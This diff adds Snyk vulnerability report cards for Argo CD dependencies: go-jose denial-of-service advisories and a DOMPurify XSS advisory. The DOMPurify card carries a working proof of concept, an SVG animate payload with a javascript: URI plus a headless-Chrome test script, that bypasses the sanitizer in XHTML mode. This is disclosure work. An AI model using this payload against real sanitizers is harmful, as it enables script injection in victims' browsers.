+        <li><a href="https://github.com/go-jose/go-jose/security/advisories/GHSA-4w3g-jfj2-cw2q">GitHub Advisory</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/commit/35883f7999e87cbd1b1f4cda07fdad8cd71c3dd6">GitHub Commit</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/commit/74114c2fa22669a2b2a296746eaa82e15566fd54">GitHub Commit</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/pull/292">GitHub PR</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/releases/tag/v4.1.5">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOJOSEGOJOSEV4CIPHER-21755484">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Uncontrolled Recursion</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--medium">
+                        <span class="label__text">medium severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Not Defined</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd/argoproj/argo-cd/v3 <span class="list-paths__item__arrow">›</span> go.mod
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: golang
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            github.com/go-jose/go-jose/v3/json
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    github.com/argoproj/argo-cd/v3@0.0.0, github.com/oauth2-proxy/mockoidc@#caebfff84d25 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/oauth2-proxy/mockoidc@#caebfff84d25
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v3@3.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v3/json@3.0.1
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Uncontrolled Recursion through the JSON parsing process. An attacker can cause the application to crash by submitting deeply nested arrays or objects, leading to stack exhaustion.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>There is no fixed version for <code>github.com/go-jose/go-jose/v3/json</code>.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/go-jose/go-jose/security/advisories/GHSA-vvm8-gf78-28g4">GitHub Advisory</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/commit/a31af25836222f4c45d366d6e8f9b1049dd9935a">GitHub Commit</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/pull/290">GitHub PR</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/releases/tag/v4.1.5">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOJOSEGOJOSEV3JSON-21755482">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Improper Validation of Array Index</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--medium">
+                        <span class="label__text">medium severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Not Defined</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd/argoproj/argo-cd/v3 <span class="list-paths__item__arrow">›</span> go.mod
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: golang
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            github.com/go-jose/go-jose/v3/cipher
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    github.com/argoproj/argo-cd/v3@0.0.0, github.com/oauth2-proxy/mockoidc@#caebfff84d25 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/oauth2-proxy/mockoidc@#caebfff84d25
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v3@3.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v3/cipher@3.0.1
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Improper Validation of Array Index in the CBC-HMAC decryption process. An attacker can cause a panic and disrupt service availability by submitting specially crafted ciphertext that results in an empty buffer being passed to the unpadding routine. This is only exploitable if applications decrypt attacker-controlled ciphertext using A128CBC-HS256, A192CBC-HS384, or A256CBC-HS512 content-encryption algorithms.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>github.com/go-jose/go-jose/v3/cipher</code> to version 4.1.5 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/go-jose/go-jose/security/advisories/GHSA-4w3g-jfj2-cw2q">GitHub Advisory</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/commit/35883f7999e87cbd1b1f4cda07fdad8cd71c3dd6">GitHub Commit</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/commit/74114c2fa22669a2b2a296746eaa82e15566fd54">GitHub Commit</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/pull/292">GitHub PR</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/releases/tag/v4.1.5">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOJOSEGOJOSEV3CIPHER-21755485">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
             <h2 class="card__title">Improper Handling of Highly Compressed Data (Data Amplification)</h2>
             <div class="card__section">
         
@@ -781527,6 +782987,295 @@
         
             <div class="cta card__cta">
                 <p><a href="https://snyk.io/vuln/SNYK-JS-DOMPURIFY-20536984">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Cross-site Scripting (XSS)</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--medium">
+                        <span class="label__text">medium severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Proof of Concept</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd <span class="list-paths__item__arrow">›</span> ui/yarn.lock
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            dompurify
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    argo-cd-ui@1.0.0, redoc@2.4.0 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        argo-cd-ui@1.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        redoc@2.4.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        dompurify@3.4.13
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://github.com/cure53/DOMPurify">dompurify</a> is a DOM-only XSS sanitizer for HTML, MathML and SVG.</p>
+        <p>Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the <code>_sanitizeAttributes</code> function when <code>PARSER_MEDIA_TYPE</code> is set to <code>application/xhtml+xml</code>. In XHTML mode, <code>transformCaseFunc</code> is the identity function rather than <code>stringToLowerCase</code>, so the guard that removes <code>attributeName</code> attributes whose value contains <code>href</code> compares the preserved-case name <code>attributeName</code> against the lowercase literal <code>&quot;attributename&quot;</code> and never matches. An attacker can supply SVG content containing an <code>&lt;animate&gt;</code> or <code>&lt;set&gt;</code> element with <code>attributeName=&quot;href&quot;</code> and a SMIL <code>values</code> list ending in a <code>javascript:</code> URI, which bypasses link filtering and executes a script in the victim&#39;s browser when the parent link is clicked.</p>
+        <p><strong>Note:</strong> This is only exploitable when <code>PARSER_MEDIA_TYPE: &#39;application/xhtml+xml&#39;</code> is explicitly set and the allowlist includes <code>animate</code> (or <code>set</code>) together with <code>attributeName</code>.</p>
+        <h2 id="poc">PoC</h2>
+        <p>Tested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.</p>
+        <p>Config:</p>
+        <pre><code class="language-js">const cfg = {
+          PARSER_MEDIA_TYPE: &#39;application/xhtml+xml&#39;,
+          ALLOWED_TAGS: [&#39;svg&#39;, &#39;a&#39;, &#39;animate&#39;, &#39;text&#39;],
+          ALLOWED_ATTR: [&#39;attributeName&#39;, &#39;values&#39;, &#39;dur&#39;, &#39;fill&#39;, &#39;x&#39;, &#39;y&#39;, &#39;font-size&#39;, &#39;id&#39;, &#39;width&#39;, &#39;height&#39;],
+        };
+        </code></pre>
+        <p><code>{ PARSER_MEDIA_TYPE: &#39;application/xhtml+xml&#39;, USE_PROFILES: { svg: true }, ADD_TAGS: [&#39;animate&#39;], ADD_ATTR: [&#39;attributeName&#39;] }</code> behaves the same.</p>
+        <p>Input:</p>
+        <pre><code class="language-html">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;200&quot; height=&quot;60&quot;&gt;&lt;a id=&quot;q&quot;&gt;&lt;animate attributeName=&quot;href&quot; values=&quot;x;javascript:alert(1)&quot; dur=&quot;0.01s&quot; fill=&quot;freeze&quot;/&gt;&lt;text x=&quot;10&quot; y=&quot;40&quot; font-size=&quot;30&quot;&gt;click&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;
+        </code></pre>
+        <p>Steps:</p>
+        <ol>
+        <li>Save this as <code>poc.xhtml</code> next to <code>purify.js</code> (3.4.16) and open it in Chrome. The <code>.xhtml</code> extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.</li>
+        </ol>
+        <pre><code class="language-html">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;title&gt;poc&lt;/title&gt;
+        &lt;script src=&quot;purify.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;sink&quot;&gt;&lt;/div&gt;
+        &lt;script&gt;//&lt;![CDATA[
+        const cfg = {
+          PARSER_MEDIA_TYPE: &#39;application/xhtml+xml&#39;,
+          ALLOWED_TAGS: [&#39;svg&#39;, &#39;a&#39;, &#39;animate&#39;, &#39;text&#39;],
+          ALLOWED_ATTR: [&#39;attributeName&#39;, &#39;values&#39;, &#39;dur&#39;, &#39;fill&#39;, &#39;x&#39;, &#39;y&#39;, &#39;font-size&#39;, &#39;id&#39;, &#39;width&#39;, &#39;height&#39;],
+        };
+        const dirty = &#39;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;200&quot; height=&quot;60&quot;&gt;&lt;a id=&quot;q&quot;&gt;&lt;animate attributeName=&quot;href&quot; values=&quot;x;javascript:alert(1)&quot; dur=&quot;0.01s&quot; fill=&quot;freeze&quot;/&gt;&lt;text x=&quot;10&quot; y=&quot;40&quot; font-size=&quot;30&quot;&gt;click&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;&#39;;
+        const clean = DOMPurify.sanitize(dirty, cfg);
+        console.log(clean);
+        document.getElementById(&#39;sink&#39;).innerHTML = clean;
+        //]]&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
+        </code></pre>
+        <ol start="2">
+        <li>The logged output still contains <code>attributeName=&quot;href&quot;</code> and <code>values=&quot;x;javascript:alert(1)&quot;</code>.</li>
+        <li><code>document.getElementById(&#39;q&#39;).href.animVal</code> returns <code>&quot;javascript:alert(1)&quot;</code>.</li>
+        <li>Click &quot;click&quot; and <code>alert(1)</code> runs.</li>
+        </ol>
+        <p>As a control, remove <code>PARSER_MEDIA_TYPE</code> and change the allowlist entry to <code>attributename</code>. The output then loses <code>attributeName</code>, <code>href.animVal</code> is <code>&quot;&quot;</code>, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.</p>
+        <p>An automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.</p>
+        <details>
+        <summary>poc.sh</summary>
+        
+        <pre><code class="language-bash">#!/usr/bin/env bash
+        # PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.
+        #
+        # Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:&quot;application/xhtml+xml&quot;
+        # config that allow-lists &lt;animate&gt; + attributeName, renders the output into
+        # div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse
+        # event and reports whether alert() fired. Also runs the same allowlist in
+        # text/html mode as a control (DOMPurify strips attributeName there).
+        #
+        # usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)
+        #         DOMPURIFY_JS=/path/to/purify.js ./poc.sh
+        #         CHROME=/path/to/chrome ./poc.sh
+        # needs:  node &gt;= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.
+        # exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error
+        set -euo pipefail
+        VER=&quot;${1:-3.4.16}&quot;
+        WORK=&quot;$(mktemp -d)&quot;
+        trap &#39;rm -rf &quot;$WORK&quot;&#39; EXIT
+        
+        if [ -z &quot;${DOMPURIFY_JS:-}&quot; ]; then
+          (cd &quot;$WORK&quot; &amp;&amp; npm pack &quot;dompurify@$VER&quot; --silent &gt;/dev/null 2&gt;&amp;1 &amp;&amp; tar xzf dompurify-*.tgz) || { echo &quot;npm pack dompurify@$VER failed&quot; &gt;&amp;2; exit 2; }
+          DOMPURIFY_JS=&quot;$WORK/package/dist/purify.js&quot;
+        fi
+        if [ -z &quot;${CHROME:-}&quot; ]; then
+          for c in &quot;$HOME&quot;/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \
+                   &quot;$HOME&quot;/.cache/ms-playwright/chromium-*/chrome-linux/chrome \
+                   &quot;$(command -v google-chrome || true)&quot; &quot;$(command -v chromium || true)&quot; &quot;$(command -v chromium-browser || true)&quot;; do
+            [ -n &quot;$c&quot; ] &amp;&amp; [ -x &quot;$c&quot; ] &amp;&amp; CHROME=&quot;$c&quot; &amp;&amp; break
+          done
+        fi
+        [ -n &quot;${CHROME:-}&quot; ] || { echo &quot;no Chrome/Chromium found; set CHROME=&quot; &gt;&amp;2; exit 2; }
+        
+        cat &gt; &quot;$WORK/poc.html&quot; &lt;&lt;&#39;EOF&#39;
+        &lt;!doctype html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;poc&lt;/title&gt;
+        &lt;script src=&quot;purify.js&quot;&gt;&lt;/script&gt;
+        &lt;div id=&quot;sink&quot;&gt;&lt;/div&gt;
+        &lt;script&gt;//&lt;![CDATA[
+        const payload = &#39;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;200&quot; height=&quot;60&quot;&gt;&#39; +
+          &#39;&lt;a id=&quot;q&quot;&gt;&lt;animate attributeName=&quot;href&quot; values=&quot;x;javascript:alert(1)&quot; dur=&quot;0.01s&quot; fill=&quot;freeze&quot;/&gt;&#39; +
+          &#39;&lt;text x=&quot;10&quot; y=&quot;40&quot; font-size=&quot;30&quot;&gt;click&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;&#39;;
+        function run(mode) {
+          const cfg = {
+            ALLOWED_TAGS: [&#39;svg&#39;, &#39;a&#39;, &#39;animate&#39;, &#39;text&#39;],
+            ALLOWED_ATTR: [mode === &#39;xhtml&#39; ? &#39;attributeName&#39; : &#39;attributename&#39;, &#39;values&#39;, &#39;dur&#39;, &#39;fill&#39;, &#39;x&#39;, &#39;y&#39;, &#39;font-size&#39;, &#39;id&#39;, &#39;width&#39;, &#39;height&#39;],
+          };
+          if (mode === &#39;xhtml&#39;) cfg.PARSER_MEDIA_TYPE = &#39;application/xhtml+xml&#39;;
+          const clean = DOMPurify.sanitize(payload, cfg);
+          document.getElementById(&#39;sink&#39;).innerHTML = clean;
+          return clean;
+        }
+        //]]&gt;&lt;/script&gt;
+        EOF
+        cp &quot;$DOMPURIFY_JS&quot; &quot;$WORK/purify.js&quot;
+        # Same test inside a real XHTML document (no HTML&lt;-&gt;XHTML context flip):
+        # the page is parsed as application/xhtml+xml and the sink&#39;s innerHTML uses the XML fragment parser.
+        sed -e &#39;s#&lt;!doctype html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;poc&lt;/title&gt;#&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;title&gt;poc&lt;/title&gt;#&#39; \
+            -e &#39;s#&lt;script src=&quot;purify.js&quot;&gt;&lt;/script&gt;#&lt;script src=&quot;purify.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;#&#39; \
+            -e &#39;s#^&lt;/script&gt;$#&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;#&#39; &quot;$WORK/poc.html&quot; &gt; &quot;$WORK/poc.xhtml&quot;
+        
+        cat &gt; &quot;$WORK/drive.js&quot; &lt;&lt;&#39;EOF&#39;
+        // zero-dependency CDP driver over --remote-debugging-pipe
+        const { spawn } = require(&#39;child_process&#39;);
+        const [chrome, url, dir] = process.argv.slice(2);
+        const xurl = url.replace(/\.html$/, &#39;.xhtml&#39;);
+        const p = spawn(chrome, [&#39;--headless&#39;, &#39;--no-sandbox&#39;, &#39;--remote-debugging-pipe&#39;, &#39;--disable-gpu&#39;, &#39;--no-first-run&#39;,
+          `--user-data-dir=${dir}/profile`, &#39;about:blank&#39;], { stdio: [&#39;ignore&#39;, &#39;ignore&#39;, &#39;ignore&#39;, &#39;pipe&#39;, &#39;pipe&#39;] });
+        let id = 0, buf = &#39;&#39;; const pend = new Map(), dialogs = [];
+        p.stdio[4].on(&#39;data&#39;, (d) =&gt; {
+          buf += d; let i;
+          while ((i = buf.indexOf(&#39;\0&#39;)) &gt;= 0) {
+            const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);
+            if (m.id &amp;&amp; pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }
+            else if (m.method === &#39;Page.javascriptDialogOpening&#39;) {
+              dialogs.push(m.params.message);
+              send(&#39;Page.handleJavaScriptDialog&#39;, { accept: true }, m.sessionId);
+            }
+          }
+        });
+        function send(method, params = {}, sessionId) {
+          return new Promise((r) =&gt; { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + &#39;\0&#39;); });
+        }
+        const sleep = (ms) =&gt; new Promise((r) =&gt; setTimeout(r, ms));
+        (async () =&gt; {
+          const { result: { targetId } } = await send(&#39;Target.createTarget&#39;, { url: &#39;about:blank&#39; });
+          const { result: { sessionId: s } } = await send(&#39;Target.attachToTarget&#39;, { targetId, flatten: true });
+          await send(&#39;Page.enable&#39;, {}, s); await send(&#39;Runtime.enable&#39;, {}, s);
+          const ev = async (e) =&gt; (await send(&#39;Runtime.evaluate&#39;, { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;
+          let vulnerable = false, xhtmlDoc = false;
+          const ver = async () =&gt; ev(&#39;DOMPurify.version&#39;);
+          for (const [mode, page] of [[&#39;html&#39;, url], [&#39;xhtml&#39;, url], [&#39;xhtml&#39;, xurl]]) {
+            await send(&#39;Page.navigate&#39;, { url: page }, s); await sleep(500);
+            const docType = await ev(&#39;document.contentType&#39;);
+            if (mode === &#39;html&#39;) console.log(&#39;DOMPurify&#39;, await ver(), &#39;/&#39;, await ev(&#39;navigator.userAgent.match(/Chrome\\/[\\d.]+/)[0]&#39;));
+            dialogs.length = 0;
+            const clean = await ev(`run(${JSON.stringify(mode)})`);
+            await sleep(400); // let the 0.01s animation apply (fill=freeze)
+            const href = await ev(`(()=&gt;{const a=document.getElementById(&#39;q&#39;);return a?a.href.animVal:null})()`);
+            const box = await ev(`(()=&gt;{const t=document.querySelector(&#39;#sink text&#39;);if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);
+            if (box) for (const type of [&#39;mouseMoved&#39;, &#39;mousePressed&#39;, &#39;mouseReleased&#39;])
+              await send(&#39;Input.dispatchMouseEvent&#39;, { type, x: box[0], y: box[1], button: &#39;left&#39;, clickCount: 1 }, s);
+            await sleep(800);
+            console.log(`\n[${mode} mode, sink document ${docType}] sanitized output:\n  ${clean}`);
+            console.log(`  animated &lt;a&gt; href (animVal): ${JSON.stringify(href)}`);
+            console.log(`  alert() fired on click: ${dialogs.length ? &#39;YES &#39; + JSON.stringify(dialogs) : &#39;no&#39;}`);
+            if (mode === &#39;xhtml&#39; &amp;&amp; dialogs.length) vulnerable = true;
+            if (mode === &#39;xhtml&#39; &amp;&amp; docType === &#39;application/xhtml+xml&#39;) xhtmlDoc = dialogs.length &gt; 0;
+          }
+          console.log(vulnerable ? `\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? &#39;also executes&#39; : &#39;no&#39;})` : &#39;\nRESULT: not vulnerable&#39;);
+          p.kill(&#39;SIGKILL&#39;); process.exit(vulnerable ? 0 : 1);
+        })().catch((e) =&gt; { console.error(e); p.kill(&#39;SIGKILL&#39;); process.exit(2); });
+        EOF
+        node &quot;$WORK/drive.js&quot; &quot;$CHROME&quot; &quot;file://$WORK/poc.html&quot; &quot;$WORK&quot;
+        </code></pre>
+        </details>
+        
+        <p><strong>Note:</strong> Tested with DOMPurify 3.4.16 in Chrome 153 headless shell; also reproduced on 3.3.3, 3.3.1, and 3.2.7.</p>
+        <h2 id="details">Details</h2>
+        <p>Cross-site scripting (or XSS) is a code vulnerability that occurs when an attacker “injects” a malicious script into an otherwise trusted website. The injected script gets downloaded and executed by the end user’s browser when the user interacts with the compromised website.</p>
+        <p>This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.</p>
+        <p>Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.</p>
+        <p>Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, <code>&lt;</code> can be coded as  <code>&amp;lt</code>; and <code>&gt;</code> can be coded as <code>&amp;gt</code>; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses <code>&lt;</code> and <code>&gt;</code> as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.</p>
+        <p>The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. </p>
+        <h3 id="types-of-attacks">Types of attacks</h3>
+        <p>There are a few methods by which XSS can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Stored</strong></td>
+        <td>Server</td>
+        <td>The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.</td>
+        </tr>
+        <tr>
+        <td><strong>Reflected</strong></td>
+        <td>Server</td>
+        <td>The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.</td>
+        </tr>
+        <tr>
+        <td><strong>DOM-based</strong></td>
+        <td>Client</td>
+        <td>The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.</td>
+        </tr>
+        <tr>
+        <td><strong>Mutated</strong></td>
+        <td></td>
+        <td>The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.</td>
+        </tr>
+        </tbody></table>
+        <h3 id="affected-environments">Affected environments</h3>
+        <p>The following environments are susceptible to an XSS attack:</p>
+        <ul>
+        <li>Web servers</li>
+        <li>Application servers</li>
+        <li>Web application environments</li>
+        </ul>
+        <h3 id="how-to-prevent">How to prevent</h3>
+        <p>This section describes the top best practices designed to specifically protect your code: </p>
+        <ul>
+        <li>Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. </li>
+        <li>Convert special characters such as <code>?</code>, <code>&amp;</code>, <code>/</code>, <code>&lt;</code>, <code>&gt;</code> and spaces to their respective HTML or URL encoded equivalents. </li>
+        <li>Give users the option to disable client-side scripts.</li>
+        <li>Redirect invalid requests.</li>
+        <li>Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.</li>
+        <li>Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.</li>
+        <li>Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.</li>
+        </ul>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>dompurify</code> to version 3.4.17 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-c6gr-qvv4-5v3f">GitHub Advisory</a></li>
+        <li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2561481">Red Hat Bugzilla Bug</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-DOMPURIFY-21755403">More about this vulnerability</a></p>
             </div>
         
         </div><!-- .card -->
